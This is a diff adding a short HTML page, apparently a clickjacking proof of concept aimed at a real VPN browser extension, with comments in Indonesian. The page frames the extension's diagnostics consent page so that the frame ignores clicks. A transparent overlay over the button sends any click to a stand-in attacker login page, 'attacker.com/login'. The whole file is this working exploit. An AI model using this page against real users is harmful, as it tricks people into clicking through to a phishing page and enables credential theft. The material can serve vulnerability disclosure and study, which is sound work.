@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>ExpressVPN Preferences (Spoofed)</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+    iframe {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      z-index: 10;
+      pointer-events: none;
+    }
+
+    .click-overlay {
+      position: fixed;
+      bottom: 80px; /* posisi tombol */
+      left: 0;
+      width: 100vw;
+      height: 60px; /* kira-kira ukuran tombol */
+      z-index: 20;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Load UI dari extension -->
+<iframe src="chrome-extension://fgddmllnllkalaagkghckoinaemmogpe/src/html/diagnosticsConsent.html"></iframe>
+
+<!-- Overlay tombol palsu -->
+<div class="click-overlay" onclick="window.location.href='https://attacker.com/login'"></div>
+
+</body>
+</html>
